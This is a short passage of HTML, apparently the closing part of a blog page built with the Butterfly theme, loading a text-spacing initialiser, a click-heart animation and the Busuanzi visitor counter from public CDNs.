+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
